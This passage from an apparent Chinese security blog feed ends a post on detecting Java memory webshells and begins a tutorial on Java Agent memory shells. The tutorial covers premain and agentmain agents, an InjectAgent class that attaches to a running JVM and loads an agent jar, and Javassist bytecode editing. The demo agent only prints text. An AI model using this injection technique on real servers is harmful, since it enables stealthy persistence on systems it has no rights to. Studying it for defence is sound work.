<span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 真正的触发逻辑...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="四、检测防御策略"><a href="#四、检测防御策略" class="headerlink" title="四、检测防御策略"></a>四、检测防御策略</h3><p><strong>1. 类完整性验证</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassIntegrityVerifier</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Map&lt;String, String&gt; KNOWN_DIGESTS = Map.of(<br>        <span class="hljs-string">&quot;org.apache.catalina.core.StandardPipeline&quot;</span>, <span class="hljs-string">&quot;a1b2c3d4...&quot;</span>,<br>        <span class="hljs-string">&quot;org.apache.catalina.core.StandardContextValve&quot;</span>, <span class="hljs-string">&quot;e5f6g7h8...&quot;</span><br>    );<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">verify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (Class&lt;?&gt; clazz : Instrumentation.getAllLoadedClasses()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">digest</span> <span class="hljs-operator">=</span> calculateClassDigest(clazz);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">expected</span> <span class="hljs-operator">=</span> KNOWN_DIGESTS.get(clazz.getName());<br>            <br>            <span class="hljs-keyword">if</span> (expected != <span class="hljs-literal">null</span> &amp;&amp; !expected.equals(digest)) &#123;<br>                SecurityLogger.alert(<span class="hljs-string">&quot;Class tampered: &quot;</span> + clazz.getName());<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">calculateClassDigest</span><span class="hljs-params">(Class&lt;?&gt; clazz)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] bytecode = getClassBytes(clazz);<br>            <span class="hljs-keyword">return</span> DigestUtils.sha256Hex(bytecode);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2. 运行时行为监控</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PipelineMonitorValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Valve original;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">requestCount</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">PipelineMonitorValve</span><span class="hljs-params">(Valve original)</span> &#123;<br>        <span class="hljs-built_in">this</span>.original = original;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> &#123;<br>        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.nanoTime();<br>        original.invoke(request, response);<br>        <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.nanoTime() - start;<br>        <br>        <span class="hljs-comment">// 异常检测逻辑</span><br>        <span class="hljs-keyword">if</span> (duration &gt; TimeUnit.MILLISECONDS.toNanos(<span class="hljs-number">500</span>)) &#123;<br>            SecurityLogger.logLongInvocation(request, duration);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (requestCount.incrementAndGet() % <span class="hljs-number">1000</span> == <span class="hljs-number">0</span>) &#123;<br>            SecurityLogger.snapshotPipelineState();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>3. JVM层防护</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 启用JVM安全策略<br>-Djava.<span class="hljs-keyword">security</span>.manager <br>-Djava.<span class="hljs-keyword">security</span>.<span class="hljs-keyword">policy</span>==tomcat.<span class="hljs-keyword">policy</span><br><br># 禁止非法Attach<br>-Djdk.attach.allowAttachSelf=<span class="hljs-keyword">false</span><br>-Djdk.attach.allowAttachSelf=<span class="hljs-keyword">true</span>:com.<span class="hljs-keyword">trusted</span>.app<br></code></pre></td></tr></table></figure><p><strong>tomcat.policy示例：</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs abnf">grant &#123;<br>    // 禁止关键包修改<br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;modifyPackage.org.apache.catalina.core&quot;</span><span class="hljs-comment">;</span><br>    <br>    // 限制反射访问<br>    permission java.lang.reflect.ReflectPermission <span class="hljs-string">&quot;suppressAccessChecks&quot;</span><span class="hljs-comment">;</span><br>    <br>    // 禁止创建类加载器<br>    permission java.lang.RuntimePermission <span class="hljs-string">&quot;createClassLoader&quot;</span><span class="hljs-comment">;</span><br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>内存马</tag>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 内存马第四篇 - Agent 内存马</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E5%9B%9B%E7%AF%87%20-%20Agent%20%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-内存马第四篇-Agent-内存马"><a href="#Java-内存马第四篇-Agent-内存马" class="headerlink" title="Java 内存马第四篇 - Agent 内存马"></a>Java 内存马第四篇 - Agent 内存马</h1><h1 id="四、-Java-Agent-内存马"><a href="#四、-Java-Agent-内存马" class="headerlink" title="四、 Java Agent 内存马"></a>四、 Java Agent 内存马</h1><h2 id="4-1-Java-Agent示例"><a href="#4-1-Java-Agent示例" class="headerlink" title="4.1 Java Agent示例"></a>4.1 Java Agent示例</h2><p>对于Agent（代理）来讲，其大致可以分为两种，一种是在<strong>JVM启动前加载的</strong><code>**premain-Agent**</code>，另一种是<strong>JVM启动之后加载的</strong><code>**agentmain-Agent**</code>。这里我们可以将其理解成一种特殊的Interceptor（拦截器），如下图</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523591.jpeg" alt="premain-Agent"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523236.jpeg" alt="agentmain-Agent"></p><h3 id="4-1-1-premain-Agent"><a href="#4-1-1-premain-Agent" class="headerlink" title="4.1.1 premain-Agent"></a>4.1.1 premain-Agent</h3><h4 id="使用外部-MANIFEST-MF-文件-创建"><a href="#使用外部-MANIFEST-MF-文件-创建" class="headerlink" title="使用外部 MANIFEST.MF 文件 创建"></a>使用外部 MANIFEST.MF 文件 创建</h4><h5 id="创建Java-Agent类"><a href="#创建Java-Agent类" class="headerlink" title="创建Java Agent类"></a>创建Java Agent类</h5><p>此处不写包名，避免后续的编译的 jar 包找不到类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.premain.agent;</span><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentPremain</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">10</span> ; i++)&#123;<br>            System.out.println(<span class="hljs-string">&quot;premain-Agent&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="创建MANIFEST-MF文件"><a href="#创建MANIFEST-MF文件" class="headerlink" title="创建MANIFEST.MF文件"></a>创建MANIFEST.MF文件</h5><p><strong>最后必须有一个空行！</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Premain-Class: JavaAgentPremain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure><p>​</p><h5 id="创建测试主程序"><a href="#创建测试主程序" class="headerlink" title="创建测试主程序"></a>创建测试主程序</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//package com.test;</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Agent!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Main-Class: HelloAgent<br>Created-By: Manual Compilation<br></code></pre></td></tr></table></figure><h5 id="目录结构："><a href="#目录结构：" class="headerlink" title="目录结构："></a>目录结构：</h5><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523457.png" alt="img"></p><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>创建俩个文件夹，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523797.png" alt="img"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>HelloAgent.<span class="hljs-keyword">java</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523695.png" alt="img"></p><h5 id="创建Agent-JAR文件"><a href="#创建Agent-JAR文件" class="headerlink" title="创建Agent JAR文件"></a>创建Agent JAR文件</h5><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cfm ..\dist\agent.jar ..\src\main\resources\MANIFEST.MF JavaAgentPremain.<span class="hljs-keyword">class</span><br>jar cfm ..\dist\hello.jar ..\src\main\resources1\MANIFEST.MF HelloAgent.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523614.png" alt="img"></p><h5 id="测试运行"><a href="#测试运行" class="headerlink" title="测试运行"></a>测试运行</h5><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">javaagent:agent.jar </span>-<span class="hljs-keyword">jar </span>hello.<span class="hljs-keyword">jar</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523677.png" alt="img"></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="4-1-2-agentmain-Agent"><a href="#4-1-2-agentmain-Agent" class="headerlink" title="4.1.2 agentmain-Agent"></a>4.1.2 agentmain-Agent</h3><p>agentmain-Agent能够在JVM启动之后加载并实现相应的修改字节码功能。  </p><p>premain方法在JDK1.5中提供，在JDK版本为1.5时，开发者只能在main加载之前添加手脚，但是对于大部分内存马注入时，都是JVM已经运行的情况下。在JDK1.6中实现了attach-on-demand，我们可以使用AttachAPI动态的加载Agent，agentmain能够在JVM启动后加载并实现相应的修改字节码的功能。</p><p>AttachAPI在tool.jar中，而JVM启动时默认不加载该依赖，需要我们在classpath中额外进行指定</p><h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>VirtualMachine 可以实现获取 JVM 信息、内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p><p>该类允许我们通过给attach方法传入一个JVM的PID，来远程连接到该JVM上 ，之后我们就可以对连接的JVM进行各种操作，如注入Agent。下面是该类的主要方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//允许我们传入一个JVM的PID，然后远程连接到该JVM上</span><br>VirtualMachine.attach()<br><span class="hljs-comment">//向JVM注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</span><br>VirtualMachine.loadAgent()<br><span class="hljs-comment">//获得当前所有的JVM列表</span><br>VirtualMachine.list()<br><span class="hljs-comment">//解除与特定JVM的连接</span><br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure><h4 id="VirtualMachineDescriptor-类"><a href="#VirtualMachineDescriptor-类" class="headerlink" title="VirtualMachineDescriptor 类"></a>VirtualMachineDescriptor 类</h4><p><code>com.sun.tools.attach.VirtualMachineDescriptor</code>类是一个用来描述特定虚拟机的类，其方法可以获取虚拟机的各种信息如PID、虚拟机名称等。下面是一个获取特定虚拟机PID的示例</p><p>示例：</p><p>pom.xml:</p><p><a href="https://blog.csdn.net/weixin_39309402/article/details/102480878">Missing artifact com.sun:tools:jar:1.8.0有效解决办法（亲测）-CSDN博客</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.sun/tools --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sun<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0_451<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>system<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">systemPath</span>&gt;</span>$&#123;JAVA_HOME&#125;/lib/tools.jar<span class="hljs-tag">&lt;/<span class="hljs-name">systemPath</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">get_PID</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-keyword">if</span>(vmd.displayName().equals(<span class="hljs-string">&quot;com.test.get_PID&quot;</span>)) &#123;<br>                System.out.println(vmd.id());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523760.png" alt="img"></p><h4 id="实现-agentmain-Agent"><a href="#实现-agentmain-Agent" class="headerlink" title="实现 agentmain-Agent"></a>实现 agentmain-Agent</h4><p>编写一个 <code>Sleep_Hello</code>类，模拟正在运行的 JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SleepHello</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写JavaAgentAgentmain</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.agentmain.agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaAgentAgentmain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;agentmain-Agent&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置 MANIFEST.MF 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.agentmain.agent.JavaAgentAgentmain<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure><p>之后编译得到 <strong>Agentmain.jar</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523062.png" alt="img"></p><p>编写测试类Inject_Agent，可以将agent注入到正在运行的JVM中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentInitializationException &#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        String path=<span class="hljs-string">&quot;D:\\JavaCode\\内存马\\JavaAgentTest\\dist\\Agentmain.jar&quot;</span>;<br><br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;<br>            System.out.println(vmd.displayName());<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span>(vmd.displayName().contains(<span class="hljs-string">&quot;Sleep&quot;</span>))&#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(path);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>先运行 SleepHello.java 再运行InjectAgent.java</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523253.png" alt="img"></p><h2 id="4-2-动态修改字节码"><a href="#4-2-动态修改字节码" class="headerlink" title="4.2 动态修改字节码"></a>4.2 动态修改字节码</h2><h3 id="4-2-1-Javassist"><a href="#4-2-1-Javassist" class="headerlink" title="4.2.1 Javassist"></a>4.2.1 Javassist</h3><p>用来处理Java字节码的类库，允许在已经编译好的类中添加新的方法，或者修改已有的方法，同时也可以通过手动的方式去生成一个新的类对象</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。</p><h4 id="类池-ClassPool"><a href="#类池-ClassPool" class="headerlink" title="类池 ClassPool"></a>类池 ClassPool</h4><p>ClassPool是 CtClass 对象的容器。它按需读取类文件来构造 CtClass 对象，并且保存 CtClass 对象以便以后使用。需要注意的是 ClassPool 会在内存中维护所有被它创建过的 CtClass，当 CtClass 数量过多时，会占用大量的内存，API 中给出的解决方案是有意识的调用 CtClass 的 detach() 方法以释放内存。</p><p><strong>主要方法</strong>有以下几个：</p><ul><li>getDefault：获取默认的 ClassPool 对象。</li><li>get、getCtClass：根据类名获取 CtClass 对象，用于操作类的字节码。</li><li>makeClass：创建一个新的 CtClass 对象，用于新增类。</li><li>insertClassPath、appendClassPath：插入类搜索路径，提供给类加载器用于加载类。</li><li>toClass：将修改后的 CtClass 加载至当前线程的上下文类加载器中。通过调用 CtClass 的 toClass() 方法实现了将 CtClass 转换为 Class 对象，这样就可以在运行时使用这个类。需要注意的是一旦调用该方法，则无法继续修改已经被加载的 Class 对象。</li></ul><p>获得方法如下：</p><p>通过<code>ClassPool.getDefault()</code>使用JVM的类搜索路径。如果程序运行在JBoss或者Tomcat的Web服务器上，则ClassPool可能无法找到用户的类，因为Web服务器会使用多个类加载器作为系统类加载器。在这种情况下，ClassPool必须添加额外的搜索路径</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获得方法</span><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-comment">//添加类搜索路径</span><br>cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(&lt;Class&gt;));<br></code></pre></td></tr></table></figure><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>CtClass 是 Javassist 中的一个抽象类，用于表示一个类文件。</p><p><strong>CtClass 需要关注的方法：</strong></p><ul><li>freeze：冻结一个类，使其不可修改。</li><li>isFrozen：判断一个类是否已被冻结。</li><li>prune：删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用。</li><li>defrost：解冻一个类，使其可以被修改。如果事先知道一个类会被 defrost ， 则禁止调用 prune 方法。</li><li>detach：将该 class 从 ClassPool 中删除。</li><li>setSuperclass：设置当前类的父类。</li><li>writeFile：将 CtClass 对象转换为类文件并将其写入本地磁盘。</li><li>toClass：通过类加载器加载该 CtClass ，示例：<code>Class clazz = cc.toClass();</code> 。</li><li>toBytecode：获取 CtClass 的字节码，示例：<code>byte[] b = cc.toBytecode();</code> 。</li></ul><p>可以通过以下代码获取</p><figure class="highlight 